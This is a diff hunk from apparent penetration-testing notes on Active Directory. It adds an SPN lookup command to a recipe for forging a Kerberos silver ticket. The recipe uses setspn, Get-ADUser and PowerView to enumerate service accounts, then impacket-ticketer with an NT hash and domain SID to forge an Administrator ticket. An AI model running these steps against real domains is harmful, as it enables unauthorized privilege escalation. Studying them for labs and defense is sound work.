@@ -266,11 +266,14 @@ Get-LocalUser -Name 'svc_mssql' | select name,sid(result without the last 3digit
 String Convert to NTLM hash:
 https://codebeautify.org/ntlm-hash-generator
 
-Get SPN:
+Get SPN of the service account or computer account:
 Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
 or
 Import-Module .\PowerView.ps1
 setspn -L svc_mssql | setspn -L computer_account(such as dc01$ or web01$)
+
+Get the account name does this SPN runs on:
+setspn -Q HTTP/WEB01.corp.local
 
 Exploiting silver ticket:
 impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn HOST/WEB01.corp.local(spn runs by the service account) -user-id 500 Administrator
